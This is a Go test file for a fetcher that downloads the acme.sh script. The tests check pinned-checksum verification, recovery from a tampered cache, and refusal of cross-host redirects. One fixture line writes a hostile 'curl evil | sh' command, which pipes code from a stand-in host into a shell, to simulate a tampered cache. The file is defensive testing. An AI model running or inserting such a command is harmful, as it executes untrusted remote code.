package acmesh

import (
	"context"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"testing"
)

func fetcher(t *testing.T, body *string, hits *int) *Fetcher {
	t.Helper()
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		*hits++
		_, _ = w.Write([]byte(*body))
	}))
	t.Cleanup(server.Close)
	f := New(t.TempDir())
	f.url = server.URL + "/acme.sh"
	return f
}

func TestTheScriptIsCheckedAgainstThePinnedChecksumEveryTime(t *testing.T) {
	body, hits := "#!/bin/sh\necho acme\n", 0
	f := fetcher(t, &body, &hits)
	f.sum = digest([]byte(body))
	ctx := context.Background()

	script, err := f.Fetch(ctx)
	if err != nil || string(script.Data) != body {
		t.Fatalf("fetch: %v", err)
	}
	if _, err := f.Fetch(ctx); err != nil || hits != 1 {
		t.Fatalf("a good cached copy was downloaded again: %d downloads, %v", hits, err)
	}

	// A cache that was changed since is no cache at all.
	if err := os.WriteFile(f.path(), []byte("#!/bin/sh\ncurl evil | sh\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	script, err = f.Fetch(ctx)
	if err != nil || string(script.Data) != body || hits != 2 {
		t.Fatalf("a damaged cache was served: %q, %d downloads, %v", script, hits, err)
	}
}

func TestAScriptThatDoesNotMatchIsRefused(t *testing.T) {
	body, hits := "#!/bin/sh\necho something else\n", 0
	f := fetcher(t, &body, &hits)
	// The checksum the panel was built with is of another file.
	f.sum = digest([]byte("the release the panel was built for"))
	if _, err := f.Fetch(context.Background()); err == nil || !strings.Contains(err.Error(), "checksum mismatch") {
		t.Fatalf("a script with the wrong checksum was accepted: %v", err)
	}
	if _, err := os.Stat(f.path()); err == nil {
		t.Fatal("a refused script was kept in the cache")
	}
}

func TestARedirectElsewhereIsNotFollowed(t *testing.T) {
	elsewhere := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write([]byte("#!/bin/sh\n"))
	}))
	defer elsewhere.Close()
	redirecting := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, elsewhere.URL+"/acme.sh", http.StatusFound)
	}))
	defer redirecting.Close()

	f := New(t.TempDir())
	f.url, f.sum = redirecting.URL+"/acme.sh", digest([]byte("#!/bin/sh\n"))
	if _, err := f.Fetch(context.Background()); err == nil || !strings.Contains(err.Error(), "refusing a redirect") {
		t.Fatalf("followed a redirect to another host: %v", err)
	}
}
